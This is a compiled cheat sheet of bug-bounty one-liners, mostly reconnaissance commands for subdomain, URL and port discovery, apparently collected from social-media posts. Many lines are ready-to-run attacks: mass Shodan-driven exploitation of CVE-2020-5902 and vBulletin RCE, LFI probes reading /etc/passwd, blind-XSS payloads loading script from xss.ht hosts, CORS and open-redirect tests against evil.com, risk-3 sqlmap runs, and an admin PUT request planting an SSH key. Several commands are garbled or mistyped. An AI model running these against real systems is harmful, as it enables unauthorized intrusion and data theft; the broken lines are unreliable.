One-liner Bug Bounty Tips

Definitions

This section defines specific terms or placeholders that are used throughout one-line command/scripts.

    1.1. “HOST” defines one hostname, (sub)domain, or IP address, e.g. replaced by internal.host, domain.tld, sub.domain.tld, or 127.0.0.1.
    1.2. “HOSTS.txt” contains criteria 1.1 with more than one in file.
    2.1. “URL” definitely defines the URL, e.g. replaced by http://domain.tld/path/page.html or somewhat starting with HTTP/HTTPS protocol.
    2.2. “URLS.txt” contains criteria 2.1 with more than one in file.
    3.1. “FILE.txt” or “FILE{N}.txt" means the files needed to run the command/script according to its context and needs.
    4.1. “OUT.txt” or “OUT{N}.txt" means the file as the target storage result will be the command that is executed.
 
 Local File Inclusion

    @dwisiswant0

gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

Open-redirect

    @dwisiswant0

export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'

    @N3T_hunt3r

cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null

XSS

    @cihanmehmet

gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt

    @fanimalikhack

waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt

    @oliverrickfors

cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"

Prototype Pollution

    @R0X4R

subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

CVE-2020–5902

    @Madrobot_

shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done

CVE-2020–3452

    @vict0ni

while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt

CVE-2022–0378

    @7h3h4ckv157

cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done

vBulletin 5.6.2 — ‘widget_tabbedContainer_tab_panel’ Remote Code Execution

    @Madrobot_

shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;

Find JavaScript Files

    @D0cK3rG33k

assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done

Extract Endpoints from JavaScript

    @renniepak

cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

Get CIDR & Org Information from Target Lists

    @steve_mcilwain

for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done

Get Subdomains from RapidDNS.io

    @andirrahmani1

curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u

Get Subdomains from BufferOver.run

    @_ayoubfathi_

curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u

    @AnubhavSingh_

export domain="HOST"; curl "https://tls.bufferover.run/dns?q=$domain" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$domain"

Get Subdomains from Riddler.io

    @pikpikcu

curl -s "https://riddler.io/search/exportcsv?q=pld:HOST" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomains from VirusTotal

    @pikpikcu

curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomain with cyberxplore

    @pikpikcu

curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+"

Get Subdomains from CertSpotter

    @caryhooper

curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomains from Archive

    @pikpikcu

curl -s "http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

Get Subdomains from JLDC

    @pikpikcu

curl -s "https://jldc.me/anubis/subdomains/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomains from securitytrails

    @pikpikcu

curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u

Bruteforcing Subdomain using DNS Over

    @pikpikcu

while read sub; do echo "https://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u ; done < FILE.txt

Get Subdomains With sonar.omnisint.io

    @pikpikcu

curl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u

Get Subdomains With synapsint.com

    @pikpikcu

curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2FHOST" | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u

Get Subdomains from crt.sh

    @vict0ni

curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

Sort & Tested Domains from Recon.dev

    @stokfedrik

curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u | httpx -silent

Subdomain Bruteforcer with FFUF

    @GochaOqradze

ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'

Find Allocated IP Ranges for ASN from IP Address

    wains.be

whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n

Extract IPs from a File

    @emenalf

grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt

Ports Scan without CloudFlare

    @dwisiswant0

subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe

Create Custom Wordlists

    @tomnomnom

gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' FILE1.txtcat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt

Extracts Juicy Informations

    @Prial Islam Khan

for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done

Find Subdomains TakeOver

    @hahwul

subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ;

Dump Custom URLs from ParamSpider

    @hahwul

cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;

URLs Probing with cURL + Parallel

    @akita_zen

cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk

Dump In-scope Assets from chaos-bugbounty-list

    @dwisiswant0

curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'

Dump In-scope Assets from bounty-targets-data

    @dwisiswant0

HackerOne Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'

BugCrowd Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

Intigriti Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'

YesWeHack Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

HackenProof Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'

Federacy Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

Dump URLs from sitemap.xml

    @healthyoutlet

curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'

Pure Bash Linkfinder

    @ntrzz

curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > FILE.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < FILE.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf FILE.txt

Extract Endpoints from swagger.json

    @zer0pwn

curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'

CORS Misconfiguration

    @manas_hunter

site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done

Find Hidden Servers and/or Admin Panels

    @rez0__

ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt

Recon Using api.recon.dev

    @z0idsec

curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jg .[].domain

Find Live Host/Domain/Assets

    @YashGoti

subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u

XSS without gf

    @HacktifyS

waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done

Get Subdomains from IPs

    @laughface809

python3 hosthunter.py HOSTS.txt > OUT.txt

Gather Domains from Content-Security-Policy

    @geeknik

curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u




Nuclei Command
~ > nuclei -a ransomsec -target /tmp/dangerous-shell.sh
~ > nuclei -l ./targets.txt -t ./CVE-2022-35405.yaml
~ > cat js_final.txt | nuclei -t /tmp/FindBug/token/secret-token-expose.yaml -o token-expose.txt
~ > chaos -d hackerone.com -silent | dnsprobe -silent -f domain| httprobe -prefer-https | nuclei -t nuclei-templates/subdomain-takeover/detect-all-takeovers.yaml

# Extract Cloudflare Protected hosts from nuclei output
~ > cat nuclei_results.txt | grep ":cloudflare" | awk '{print $(NF)}' | sed -E 's/^\s*.*:\/\///g' | sed 's/\///'g | sort -u > cloudflare_hosts.txt

#Uncover Command
~ > echo jira | uncover -e shodan,fofa,censys -v

FFUF Command
~ > ffuf -u https://codingo.io/FUZZ -w ./wordlist -recursion -e .bak
~ > ffuf -u https://rendering-prd.redacted.com/FUZZ -w english-words.txt -mc all -fw 6
~ > ffuf -c -w HOST:hosts.txt -w ~/wordlist/words.txt -u HOST/FUZZ -mc 200 
~ > ffuf -w "host_list.txt:URL" -u "https://URL/api/v2/cmdb/system/admin/admin" -x PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000;' -d '{"ssh-public-key1" "h4x0r"}' -mr "SSH" -r -x http://127.0.0.1:8080

Ghauri Command
~ > ghauri -r sqli-req.txt --dbms=MySQL --technique=T --current-db

SQLMAP Command
~ > sqlmap -r sqli-req.txt --current-db --technique=T --dbms=MySQL --level=2 --risk=3 --random-agent --no-cast

HTTPX Command
~ > cat domains.txt | httpx -path wordlist.txt -fc 400,403,404
# get overview of domains
~ > cat subdomains.txt | httpx -title -td -sc -server

# Noobtip Find Subdomains via @owasp amass and performa quick scan of all discovered subdomains via NMAP.
~ > amass db -show -d TARGET 2>/dev/null | grep TARGET | while read HOST; do nmap -sC -v -Pn $HOST; done

Local File Inclusion : by @dwisiswant0
~ > gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -C 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

Waybackurls command
~ > waybackurls example.com | grep -a -i \=http | bhedak ' http://evil.com' | while read host do; do curl -s 
-L $ host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done

# Search JS using Gau + grep
~ > gau -subs DOMAIN | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' >> js-output.txt

# IDOR Command
~ > cat urls.txt | grep "id=[\d]*" | tee idor.txt

# Recon Tools Example
~ > cat rootDomains.txt | assetfinder subs-only | httpx -p 80,443,8080,8443,9000 -nc -silent > hosts.txt; 
~ > katana -list hosts.txt -nc -silent -c 50 | nuclei -t <your templates>

# Automatic One Liner SSRF: 
~ > assetfinder --subs-only target | httprobe | gau | gf ssrf | nuclei -t nuclei-templates/vulnerabilities/microstrategy-ssrf.yaml

# Manual testing SSRF
~ > assetfinder --subs-only target | httprobe | gau | gf ssrf | parallel -j curl --proxy http://127.0.0.1:8080 -sk 2>/dev/null

Then use burp callobrator to manipulate SSRF

# SSRF TIP:
# Collect .js files
~ > subfinder -d <domain> -silent -all | httpx | getJS -complete | tee -a <domain>.js

# Collect Endpoints 
~ > cat <domain>.js | linkJs -m endpoints | tee -a endpoints.txt

# Construct a wordlist
~ > ./wordlistgen endpoints.txt parameters.txt | tee -a wordlist

# Should be in the format
~ > /endpoint/?url=FUZZ 
# Run FFUF against the domain and wordlist

# Findomain Command
~ > findomain -qt hackerone.com | unimap --fast-scan --stdin --url-output | fhc

# Bash one liner to take screenshot of web services running
~ > IP="192.168.0"; for p in '80' '443'; do for i in $(seq 0 5); do TAKE_SS=$(cutycapt --url=$IP.$i:$p --out=$IP.$i:$p.png); done; done

# Recon another way
~ > subfinder -d target.com -silent | httpx -silent -o urls.txt
~ > subfinder -silent -d spotify.com | zdns A | jq '.[].answers?[]?' | jq -r 'select(.type == "A") | [.name, .answer] | @csv' | tee resolvers.txt
~ > subfinder -d vulrweb.com -all -silent | httpx -silent| katana -silent | Gxss -c 100 | dalfox pipe --skip-bav --skip-mining-all --skip-grepping
~ > subfinder -d ups.com -all -silent | httpx -threads 100 -silent | csprecon -d ups.com -s | anew old_domains.txt
~ > subfinder -d disney.com -silent -all | httpx -silent -o disney_httpx.txt for i in$(cat disney_httpx.txt); do DOMAIN=$(echo $i | unfurl format %d); ffuf -u $i/FUZZ -w common-api-endpoints.txt -o ${DOMAIN}_ffuf.txt; done

# Find Subdomains TakeOver
~ > subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack-w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v 3 >> takeover ;

# get all target URLs
~ > subfinder -d tesla.com -silent -all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg, ico,woff,woff2,gif | tee -a urls
# filter potential SQLi url
cat urls | gf sqli | tee -a sqli
# run SQLi test
while read line; do sqlmap -u $line --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3; done < sqli

# AMASS Command
~ > amass enum -norecursive -passive --config /amass/examples/config.ini -d example.com

# naabu command
~ > naabu -l target.txt -rate 3000 -retries 1 -warm-up-time 0 -c 50 -top-ports 1000 -silent
~ > echo hackerone.com | naabu -silent | bash naabu2nmap.sh
~ > time chaos -d hackerone.com -silent | naabu -ports full -silent | httpx

# Recon
~ > cat web-server.txt | aquatone -silent -http-timeout 5000 -out aquatone-screenshots -scan-timeout 1000 -resolution "1600x1200" -screenshot-timeout 10000

# Recon 
~ > cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443,8090,9090 -random-agent -silent | katana -ef css,js | \
while read testing_sqli;do sqlmap -u "$testing_sqli" \
--force-ssl -v 5\
--parse-errors \
--current-db --batch \
--random-agent --threads = 5 \
--risk=3 --level=5 --invalid-string \
--invalid-logical --invalid-bignum \
--tamper=unionalltounion \
; done

# URLs only, exclude urlscan.io
~ > python3 waymore.py -i ups.com -f --from-date 2010 -mode U --no-subs -xus

# download responses only
~ > python3 waymore.py -i ups.com -f --from-date 2010 -node R --timeout 45

# get Subdomains form Bufferover.run
~ > curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u

# Extracts Juicy Information
~ > for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g' | sort -u | tee -a OUT.txt ;done

# Get subdomain form Riddler.io
~ > curl -s "https://riddler.io/search/exportcsv?q=pld:host" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

# Get subdomain from Archive
~ > curl -s "http://web.archive.org/cdx/search/cdx? url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

# Get subdomain from crt.sh
~ > curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# Dump In-scope Assets from chaos-bugt
~ > curl -sl https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'

# Search Subdomain using Gospider
~ > gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew

# list of resolvers
~ > dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 100 -o dns-resolvers.txt

# resolve subdomains
~ > puredns resolve subdomains.txt -r dns-resolvers.txt -w resolved.txt

# URL Extraction
~ > gospider -S websites.txt --js -t 20 -d 2 --sitemap --robots -w -r > urls.txt
~ > cat websites.txt | gau -subs
~ > cat websites.txt | waybackurls
~ > github-endpoints -q -k -d united.com -t tokens_github.txt
~ > cat webs.txt | roboxtractor -m 1 -wb

# find .git/HEAD
~ > curl -s "https://crt.sh/?q=%.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | https -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew

# check .git/HEAD
~ > wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301.302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew

# find XSS - Single Target
~ > gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe -o result.txt

# find XSS - Multiple Target
~ > gospider -s urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe -o result.txt
 
# find XSS 
~ > hakrawler -url "$(1)" -plain -usewayback -wayback | grep "$(1)" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-}*" | dalfox pipe -b https://your.xss.ht

# BXSS - Bling XSS in Parameters
~ > subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload <script src=https://hacker.xss.ht></script>" -parameters

# Blind XSS in X-Forwarded for Header
~ > subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"

# XSS using gf with single target
~ > echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew

# XSS httpx
~ > httpx -l master.txt -silent -no-color -threads 100 -location 301,302 | awk '(print $2)' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svgonload=alert(1)>"

# XSS from javascript hidden params
~ > assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's, 'var', '"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"

# SQL Injection Oneliner
~ > findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1

# CF-CHECK usuage you don't need to do a port scan. If it's proven that the IP is owned by cloudflare
~ > echo "ubser.com" | cf-check
~ > subfinder -silent -d uber.com| filter-resolved | cf-check | sort -u | naabu --silent | httprobe

# XSS Oneliner ---> katana + Dalfox 
~ > echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav

# Local file location
~ > gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

# Open Redirect
~ > export LHOST="URL" ; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -p 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'

~ > cat urls.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/nukk

# Prototype Pollution
~ > subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'windows.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

# CVE 2020-5902
~ > shodan search http.favicon.hash:-335242539 "39993" --fields ip_str,port --separator " " | awk '{print &1":"&2}' | while read host do ; do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?filename=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;032mNot Vulnerable\n";done

# find javascript files
~ > assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9_}+" |sed -e 's, 'var', '"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done

# Extract Endpoints from javascripts
~ > cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]"\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

# Get CIDR & Org Information from Target List
~ > for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST + short); do whois $ip | grep -e "CIDR\|Organizaton" | tr -s " " | paste - -; d one | uniq);done

# using gau
~ > cat subdomains.txt | gau | grep -iE '\.js $' | anew js-urls.txt

# using waybackurls
~ > cat subdomains.txt | waybackurls | grep -ie '\.js$' | anew js-urls.txt

# Endpoints
~ > katana -u https://disney.com -js-crawl -d S -hl -field endpoint | anew endpoints.txt

# gau
~ > gau video.uber.com | python3 ssrf.py dcb39ac17f1f.ngrok.io


# Javascript recon when target is using Graphql
# find all embedded graphql queries/mutations using bash one liner

~ > cat jsfile.js | nestle -regex '(query|mutation)\s+[a-zA-Z]+[0-9]*[a-zA-Z]+(\([^(\(|\))]+\))*\s*[{:nested:}]' | sed 's/\\n/\n/g'

# create a list of resolvers
~ > dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 100 -0 dns-resolvers.txt

# resolve subdomains
~ > puredns resolve subdomains.txt -r dns-resolvers.txt -w resolved.txt

# Gather Domainns from Content-Security-Policy
~ > curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -E0 "[a-zA-Z0-9./?=_-]*" | sed -e '/\./!d' -e '/[^3A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u


~ > nuclei -l ./targets.txt -t ./CVE-2022-35405.yaml

-------------------------------------------------------------------------------------
# ReconOne # 1

#!/bin/bash
# $1 => example.domain

amass enum --passive -d $1 -o domains_$1
assetfinder --subs-only $1 | tee -a domains_$1

subfinder -d $1 -o domains_subfinder_$1
cat domains_subfinder_$1 | tee -a domain_$1

# filtering the domains
sort -u domains_$1 -o domains_$1
cat domains_$1 | filter-resolved | tee -a domains_$1.txt

cat domains_$1 | ~/go/bin/httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss | tee xss.txt
----------------------------------------------------------------------------------------

---------------------------------------------------------------------------------------
# ReconTwo # 2

gauq() {
  gau $1 -subs | \
  grep "=" | \
  cgrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | \
  qsreplace -a
}

sqliz() {
  gauq $1 | python3 $HOME/Tools/DSSS/dsss.py
}

bxss() {
  BLIND="https://your.xss.ht"
  gauq $1 | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | \
  dalfox pipe -b $BLIND
}

cat target.com | gau -subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind username.xss.ht

--------------------------------------------------------------------------------------------



